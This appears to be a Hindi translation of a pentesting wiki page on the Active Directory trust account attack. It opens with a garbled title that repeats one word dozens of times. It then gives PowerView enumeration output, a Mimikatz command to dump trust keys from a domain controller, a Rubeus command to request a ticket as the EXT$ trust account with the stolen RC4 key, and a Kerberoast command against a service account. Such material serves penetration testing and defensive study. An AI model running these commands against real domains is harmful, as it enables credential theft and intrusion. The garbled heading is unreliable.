# बाहरी वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन वन व
```powershell
# Notice Outbound trust
Get-DomainTrust
SourceName      : root.local
TargetName      : ext.local
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM

# Lets find the current domain group giving permissions to the external domain
Get-DomainForeignGroupMember
GroupDomain             : root.local
GroupName               : External Users
GroupDistinguishedName  : CN=External Users,CN=Users,DC=DOMAIN,DC=LOCAL
MemberDomain            : root.io
MemberName              : S-1-5-21-1028541967-2937615241-1935644758-1115
MemberDistinguishedName : CN=S-1-5-21-1028541967-2937615241-1935644758-1115,CN=ForeignSecurityPrincipals,DC=DOMAIN,DC=LOCAL
## Note how the members aren't from the current domain (ConvertFrom-SID won't work)
```
## विश्वास खाता हमला

एक सुरक्षा दुरुपयोग उत्पन्न होता है जब दो डोमेन के बीच विश्वास संबंध स्थापित किया जाता है, जिन्हें यहाँ डोमेन **A** और डोमेन **B** के रूप में पहचाना गया है, जहां डोमेन **B** अपना विश्वास डोमेन **A** के प्रति बढ़ाता है। इस सेटअप में, डोमेन **A** में डोमेन **B** के लिए एक विशेष खाता बनाया जाता है, जो दोनों डोमेन के बीच प्रमाणीकरण प्रक्रिया में महत्वपूर्ण भूमिका निभाता है। इस खाते को जिसे डोमेन **B** से जोड़ा गया है, दोनों डोमेन के बीच सेवाओं तक पहुँचने के लिए टिकटों को एन्क्रिप्ट करने के लिए उपयोग किया जाता है।

यहाँ महत्वपूर्ण पहलू समझना है कि इस विशेष खाते का पासवर्ड और हैश डोमेन **A** में एक डोमेन कंट्रोलर से निकाला जा सकता है जिसके लिए एक कमांड लाइन टूल का उपयोग किया जाता है। इस कार्रवाई को करने के लिए कमांड है:
```powershell
Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
```
यह निकास संभव है क्योंकि खाता, जिसे उसके नाम के बाद **$** के साथ पहचाना गया है, सक्रिय है और डोमेन **A** के "Domain Users" समूह का हिस्सा है, इसलिए इस समूह से संबंधित अनुमतियों को विरासत में प्राप्त करता है। इससे व्यक्तियों को इस खाते के प्रमाणों का उपयोग करके डोमेन **A** के खिलाफ प्रमाणीकरण करने की अनुमति होती है।

**चेतावनी:** डोमेन **A** में एक उपयोगकर्ता के रूप में एक कदम प्राप्त करने के लिए इस स्थिति का उपयोग करना संभव है, हालांकि इस एक्सेस से सीमित अनुमतियों के साथ। हालांकि, यह एक्सेस डोमेन **A** पर जांच करने के लिए पर्याप्त है।

जहां `ext.local` विश्वसनीय डोमेन है और `root.local` विश्वसनीय डोमेन है, वहां `root.local` में `EXT$` नाम का एक उपयोगकर्ता खाता बनाया जाएगा। विशेष उपकरणों के माध्यम से, Kerberos विश्वास कुंजियों को डंप करना संभव है, जिससे `root.local` में `EXT$` के प्रमाणों को प्रकट किया जा सकता है। इसे प्राप्त करने के लिए यह आदेश है:
```bash
lsadump::trust /patch
```
निम्नलिखित के अनुसार, कोई भी एक्सट्रैक्ट किया गया RC4 कुंजी का उपयोग करके `root.local` में `root.local\EXT$` के रूप में प्रमाणीकरण के लिए एक और उपकरण कमांड का उपयोग किया जा सकता है:
```bash
.\Rubeus.exe asktgt /user:EXT$ /domain:root.local /rc4:<RC4> /dc:dc.root.local /ptt
```
यह प्रमाणीकरण चरण `root.local` के भीतर सेवाओं को जांचने और उन्हें उत्पीड़ित करने की संभावना खोलता है, जैसे कि सेवा खाता क्रेडेंशियल निकालने के लिए Kerberoast हमला करना:
```bash
.\Rubeus.exe kerberoast /user:svc_sql /domain:root.local /dc:dc.root.local
```
### साफ पाठ्य विश्वसनीयता पासवर्ड जुटाना

पिछले फ्लो में विश्वसनीयता हैश का उपयोग किया गया था बजाय **साफ पाठ्य विश्वसनीयता पासवर्ड** का (जो **mimikatz द्वारा डंप किया गया था**).

साफ पाठ्य विश्वसनीयता पासवर्ड को हेक्साडेसिमल से परिवर्तित करके और नल बाइट्स '\x00' को हटाकर प्राप्त किया जा सकता है:

![](<../../.gitbook/assets/image (2) (1) (2) (1).png>)

कभी-कभी विश्वास संबंध बनाते समय, एक पासवर्ड को यूजर द्वारा विश्वास के लिए टाइप किया जाना चाहिए। इस प्रदर्शन में, कुंजी मूल विश्वास पासवर्ड है और इसलिए मानव द्वारा पढ़ने योग्य है। जैसे ही कुंजी साइकिल होती है (30 दिन), साफ पाठ्य अब मानव द्वारा पढ़ने योग्य नहीं होगा लेकिन तकनीकी रूप से उपयोगी रहेगा।

साफ पाठ्य विश्वसनीयता पासवर्ड का उपयोग नियमित प्रमाणीकरण के लिए किया जा सकता है जैसे विश्वास खाता, विश्वास खाते के कर्बेरोस गुप्त कुंजी का उपयोग करके एक टीजीटी का अनुरोध करने का एक विकल्प। यहाँ, ext.local से root.local का क्वेरी करके Domain Admins के सदस्यों के लिए:

![](<../../.gitbook/assets/image (1) (1) (1) (2).png>)

## संदर्भ

* [https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-7-trust-account-attack-from-trusting-to-trusted)
